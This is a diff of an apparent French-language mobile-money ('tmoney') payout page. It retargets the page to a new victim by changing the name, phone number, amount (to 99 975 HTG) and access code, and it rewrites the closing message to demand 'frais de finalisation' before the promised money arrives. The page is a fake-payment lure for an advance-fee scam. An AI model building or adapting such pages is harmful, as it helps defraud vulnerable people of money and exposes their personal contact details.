@@ -177,17 +177,17 @@
     <form id="tmoneyForm" onsubmit="return false;">
       <div class="form-group">
         <label for="name">Nom et Prénom</label>
-        <input type="text" id="name" value="Augustin Leno" disabled />
+        <input type="text" id="name" value="Alexis " disabled />
       </div>
 
       <div class="form-group">
         <label for="phone">Numéro</label>
-        <input type="tel" id="phone" value="+224 622 492 395" disabled />
+        <input type="tel" id="phone" value="+509 47 49 6243" disabled />
       </div>
 
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="8.011.556 GNF" disabled />
+        <input type="text" id="amount" value="99 975 HTG" disabled />
       </div>
 
       <button class="btn" type="button" onclick="startProgress()">Procéder</button>
@@ -202,7 +202,7 @@
       </div>
 
     <div class="notification-message" id="notificationMessage">
-  <span style="color: green; font-weight: bold;">Félicitation vous avez réussi :</span> Mais le montant de recharge es insuffisant pour terminer la transaction.
+  <span style="color: green; font-weight: bold;">Félicitation vous avez réussi :</span> Vueillez payer les frais de finalisation pour terminer la transaction.
 </div>
 
     </form>
@@ -213,7 +213,7 @@
       const code = document.getElementById("accessCode").value;
       const error = document.getElementById("accessError");
 
-      if (code === "2395") {
+      if (code === "6243") {
         error.style.display = "none";
         document.getElementById("accessContainer").style.display = "none";
         document.getElementById("formContainer").style.display = "block";
